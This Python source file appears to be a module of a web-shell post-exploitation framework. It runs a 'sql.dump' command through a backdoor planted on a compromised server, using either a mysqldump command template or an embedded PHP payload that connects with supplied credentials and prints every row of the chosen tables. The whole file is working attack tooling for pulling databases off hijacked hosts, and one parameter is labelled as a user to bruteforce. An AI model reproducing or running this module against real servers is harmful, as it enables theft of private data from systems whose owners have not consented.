'''
Created on 22/ago/2011

@author: norby
'''

from core.module import Module, ModuleException
from core.vector import VectorList, Vector
import random
from core.parameters import ParametersList, Parameter as P

classname = 'Dump'
 
    
class Dump(Module):
    '''Get SQL database dump
    :sql.dump mysql <host> <user> <pass> <db name> <table name>|any
    '''

    
    vectors = VectorList( [
            Vector('shell.sh', 'mysqldump', "mysqldump -h %s -u %s --password=%s %s %s") ,
            Vector('shell.php', 'mysqlphpdump', """
function dmp ($table)
{
    $result .= "-- -------- TABLE '$table' ----------\n";
    $query = mysql_query("SELECT * FROM ".$table);
    $numrow = mysql_num_rows($query);
    $numfields = mysql_num_fields($query);
    print $numrow . " " . $numfields;
    if ($numrow > 0)
    {
        $result .= "INSERT INTO `".$table."` (";
        $i = 0;
        for($k=0; $k<$numfields; $k++ )
        {
            $result .= "`".mysql_field_name($query, $k)."`";
            if ($k < ($numfields-1))
                $result .= ", ";
        }
        $result .= ") VALUES ";
        while ($row = mysql_fetch_row($query))
        {
            $result .= " (";
            for($j=0; $j<$numfields; $j++)
            {
                if (mysql_field_type($query, $j) == "string" ||
                    mysql_field_type($query, $j) == "timestamp" ||
                    mysql_field_type($query, $j) == "time" ||
                    mysql_field_type($query, $j) == "datetime" ||
                    mysql_field_type($query, $j) == "blob")
                {
                    $row[$j] = addslashes($row[$j]);
                    $row[$j] = ereg_replace("\n","\\n",$row[$j]);
                    $row[$j] = ereg_replace("\r","",$row[$j]);
                    $result .= "'$row[$j]'";
                }
                else if (is_null($row[$j]))
                    $result .= "NULL";
                else
                    $result .= $row[$j];
                if ( $j<($numfields-1))
                    $result .= ", ";
            }
            $result .= ")";
            $i++;
            if ($i < $numrow)
                $result .= ",";
            else
                $result .= ";";
            $result .= "\n";
        }
    }
    else
        $result .= "-- table is empty";
    return $result . "\n\n";
}
mysql_connect("%s","%s","%s");
$db_name = "%s";
$db_table_name = "%s";
mysql_select_db($db_name);
$tableQ = mysql_list_tables ($db_name);
$i = 0;
while ($i < mysql_num_rows ($tableQ))
{
    $tb_names[$i] = mysql_tablename ($tableQ, $i);
    if(($db_table_name == $tb_names[$i]) || $db_table_name == "") {
        print(dmp($tb_names[$i]));
    }
    $i++;
}""")
            ])


    params = ParametersList('Get SQL mysqldump-like database dump', vectors,
            P(arg='dbms', help='DBMS', choices=['mysql'], required=True, pos=0),
            P(arg='user', help='SQL user to bruteforce', required=True, pos=1),
            P(arg='pwd', help='SQL password', required=True, pos=2),
            P(arg='db', help='Database name', required=True, pos=3),
            P(arg='table', help='Table name to dump (any to dump entire database)', default='any', pos=4),
            P(arg='host', help='SQL host or host:port', default='127.0.0.1', pos=5))


    def __init__( self, modhandler , url, password):
            
        self.structure = {}

        Module.__init__(self, modhandler, url, password)
        
        

    def run_module( self, mode, user, pwd , db, table, host ):
        
        if mode != 'mysql':
            raise ModuleException(self.name,  "Only 'mysql' database is supported so far")
        
        vectors = self._get_default_vector2()
        if not vectors:
            vectors  = self.vectors.get_vectors_by_interpreters(self.modhandler.loaded_shells + [ 'sql.query' ])
        for vector in vectors:
            response = self.__execute_payload(vector, [mode, host, user, pwd, db, table])
            if response != None:
                self.params.set_and_check_parameters({'vector' : vector.name})
                return response
        
    def __execute_payload(self, vector, parameters):
        
        mode = parameters[0]
        host = parameters[1]
        user = parameters[2]
        pwd = parameters[3]
        db = parameters[4]
        table = parameters[5]
        
        if table == 'any':
            table = ''
        
        self.modhandler.set_verbosity(2)
        
        self.structure[db] = {}
          
        payload = self.__prepare_payload(vector, [host, user, pwd, db, table]) 
        response = self.modhandler.load(vector.interpreter).run({ 0: payload })
        
        self.modhandler.set_verbosity()
        
        if response:
            return response
        else:
            self.mprint('[%s] Error dumping database, no response' % self.name)
            
    def __prepare_payload( self, vector, parameters):

        if vector.payloads[0].count( '%s' ) == len(parameters):
            return vector.payloads[0] % tuple(parameters)
        else:
            raise ModuleException(self.name,  "Error payload parameter number does not corresponds")
        

                
    
    
    